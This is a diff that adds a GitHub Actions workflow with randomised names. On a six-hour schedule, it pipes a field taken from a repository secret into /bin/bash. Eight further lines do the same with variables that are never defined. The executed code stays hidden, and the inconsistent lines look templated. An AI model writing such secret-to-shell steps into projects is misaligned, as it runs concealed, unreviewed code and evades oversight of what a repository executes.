@@ -1,0 +1,25 @@
+name: renzaiyuwu
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '23 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: renzaiyuwu
+        env:
+          jce4770: ${{ secrets.jce4770 }}
+        run: |
+          echo $jce4770 | jq -r .ahdpb47 | /bin/bash
+          echo $j4693 | jq -r .ie1160 | /bin/bash
+          echo $nxkp8 | jq -r .byda1543 | /bin/bash
+          echo $czkdd6342 | jq -r .hsilo8606 | /bin/bash
+          echo $yo5 | jq -r .lyx4 | /bin/bash
+          echo $h71 | jq -r .pceot75 | /bin/bash
+          echo $u24585 | jq -r .lof32 | /bin/bash
+          echo $majp7 | jq -r .uzfed60 | /bin/bash
+          echo $eg5502 | jq -r .p09207 | /bin/bash
+
